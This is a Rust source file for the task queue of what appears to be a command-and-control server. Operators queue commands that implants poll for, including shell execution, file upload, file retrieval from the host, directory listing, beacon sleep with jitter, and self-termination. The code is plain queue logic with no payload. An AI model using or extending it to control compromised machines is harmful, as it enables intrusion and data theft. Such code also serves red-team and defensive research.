// task.rs — per-session FIFO task queues + result store
//
// design: operator pushes tasks, implant polls and pops them.
// results are stored keyed by task_id so the operator can fetch later.
//
// the queue depth cap (64) is arbitrary — if you're queuing more than
// 64 commands per session you're doing something wrong.

use chrono::{DateTime, Utc};
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use std::{collections::VecDeque, sync::Arc};
use tokio::sync::Mutex;
use uuid::Uuid;

pub const MAX_QUEUE_DEPTH: usize = 64;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum TaskKind {
    /// run a shell command via /bin/sh -c or cmd /c
    Shell { cmd: String },

    /// upload a file TO the implant
    Upload { path: String, data_b64: String },

    /// ask the implant to send a file back
    Download { path: String },

    /// list directory
    Ls { path: String },

    /// change sleep interval + jitter
    Sleep { ms: u64, jitter_pct: u8 },

    /// die gracefully
    Die,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub id:         String,
    pub session_id: String,
    pub kind:       TaskKind,
    pub queued_at:  DateTime<Utc>,
}

impl Task {
    pub fn new(session_id: &str, kind: TaskKind) -> Self {
        Task {
            id:         Uuid::new_v4().to_string(),
            session_id: session_id.to_owned(),
            kind,
            queued_at:  Utc::now(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id:     String,
    pub session_id:  String,
    pub output:      String,
    pub exit_code:   Option<i32>,
    pub error:       Option<String>,
    pub completed_at: DateTime<Utc>,
}

// per-session queue wrapped in a Mutex because VecDeque isn't Sync
type SessionQueue = Arc<Mutex<VecDeque<Task>>>;

#[derive(Clone)]
pub struct TaskQueue {
    queues:  Arc<DashMap<String, SessionQueue>>,
    results: Arc<DashMap<String, TaskResult>>,
}

impl TaskQueue {
    pub fn new() -> Self {
        TaskQueue {
            queues:  Arc::new(DashMap::new()),
            results: Arc::new(DashMap::new()),
        }
    }

    /// ensure a queue exists for this session — idempotent
    fn ensure_queue(&self, session_id: &str) -> SessionQueue {
        self.queues
            .entry(session_id.to_owned())
            .or_insert_with(|| Arc::new(Mutex::new(VecDeque::new())))
            .clone()
    }

    /// push a new task — returns Err if queue is full
    pub async fn push(&self, task: Task) -> Result<String, String> {
        let q = self.ensure_queue(&task.session_id);
        let mut lock = q.lock().await;
        if lock.len() >= MAX_QUEUE_DEPTH {
            return Err(format!("queue full for session {}", task.session_id));
        }
        let id = task.id.clone();
        lock.push_back(task);
        Ok(id)
    }

    /// implant calls this — pop the next task (if any)
    pub async fn pop(&self, session_id: &str) -> Option<Task> {
        let q = self.ensure_queue(session_id);
        let mut lock = q.lock().await;
        lock.pop_front()
    }

    /// implant submits result back
    pub fn submit_result(&self, result: TaskResult) {
        self.results.insert(result.task_id.clone(), result);
    }

    pub fn get_result(&self, task_id: &str) -> Option<TaskResult> {
        self.results.get(task_id).map(|r| r.value().clone())
    }

    pub fn all_results_for(&self, session_id: &str) -> Vec<TaskResult> {
        self.results
            .iter()
            .filter(|e| e.value().session_id == session_id)
            .map(|e| e.value().clone())
            .collect()
    }

    pub fn pending_count(&self, session_id: &str) -> usize {
        let q = self.ensure_queue(session_id);
        if let Ok(lock) = q.try_lock() {
            return lock.len();
        }
        0
    }
}

impl Default for TaskQueue {
    fn default() -> Self { Self::new() }
}
// task queue
// task tracking utilities
